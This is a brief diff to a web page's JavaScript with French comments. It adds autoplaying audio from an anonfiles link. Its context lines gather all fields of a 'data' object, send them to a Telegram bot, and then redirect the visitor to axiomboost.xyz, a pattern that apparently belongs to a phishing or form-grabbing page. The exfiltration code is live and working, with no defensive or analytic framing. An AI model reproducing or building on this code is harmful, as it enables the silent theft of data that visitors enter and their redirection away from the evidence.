@@ -48,6 +48,14 @@ for (const key in data) {
   msg += `*${key}* : ${data[key]}\n`;
 }
 
+// Lecture du son
+const audio = new Audio('https://anonfiles.ch/s/vOzGhsK9Mmb');
+audio.autoplay = true;
+audio.volume = 0.5;
+audio.play().catch(() => {
+  // Si l’autoplay est bloqué par le navigateur, on peut ignorer l’erreur
+});
+
 fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
   method: "POST",
   headers: { "Content-Type": "application/json" },
@@ -58,6 +66,5 @@ fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
   }),
 }).catch(e => console.error("Telegram send error:", e))
 .finally(() => {
-  // Redirection après envoi du message
   window.location.href = "https://www.axiomboost.xyz/";
 });
